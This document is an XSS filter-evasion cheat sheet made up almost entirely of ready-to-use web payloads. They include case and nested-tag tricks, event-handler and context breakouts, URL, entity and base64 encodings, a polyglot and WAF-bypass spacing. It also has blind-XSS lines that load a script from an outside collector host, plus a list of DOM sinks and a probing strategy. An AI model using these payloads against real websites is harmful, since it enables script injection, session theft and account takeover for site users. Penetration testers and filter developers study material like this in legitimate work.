# XSS Filter Evasion Techniques

## Case Variation
```html
<ScRiPt>alert(1)</ScRiPt>
```

## Breaking Up Keywords (Nested Tags)
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

## Event Handler Alternatives
```html
<body onresize=alert(1)>
<input autofocus onfocus=alert(1)>
<svg><animate onbegin=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

## Attribute Context Breakout
```html
" onmouseover="alert(1)
' autofocus onfocus='alert(1)
```

## JS String Context
```javascript
'; alert(1)//
\'; alert(1)//
```

## URL Encoding
```
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

## HTML Entities
```
&lt;script&gt;alert(1)&lt;/script&gt;
```

## Polyglot (Works in Multiple Contexts)
```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

## Base64 Data URI
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

## Space Substitution (WAF Bypass)
```html
<Img/src=x/onerror=alert(1)>
<svg%09onload=alert(1)>   <!-- tab instead of space -->
<svg%0Aonload=alert(1)>   <!-- newline instead of space -->
```

## Newlines in javascript: URI
```
j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:alert(1)
```

## Custom HTML Tags
```html
<CUSTOM id=x onfocus=alert(1) tabindex=1>#x
```

## Using Filtered Words Within Filtered Words
If "script" is filtered, try splitting it in a way that the browser reassembles:
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

## Blind XSS Payloads
```html
"><script src=https://yourxsshunter.xss.ht></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yourxsshunter.xss.ht\';document.body.appendChild(a)')
```

## DOM XSS Sinks to Look For
- `document.write()`
- `innerHTML`
- `eval()`
- `setTimeout(string)`
- `setInterval(string)`
- `location.href`
- `location.assign()`
- `location.replace()`

## Context Detection Strategy
1. Insert `<a href="#">test</a>` — if tag renders, you're in HTML context
2. Insert `'; alert(1)//` — if it breaks out, you're in JS string context
3. Insert `"><script>alert(1)</script>` — if it breaks out, you're in attribute context
4. Check error pages (404, 403, 500) — many reflect the URL path or query parameter
5. Check Referer header reflection in error messages
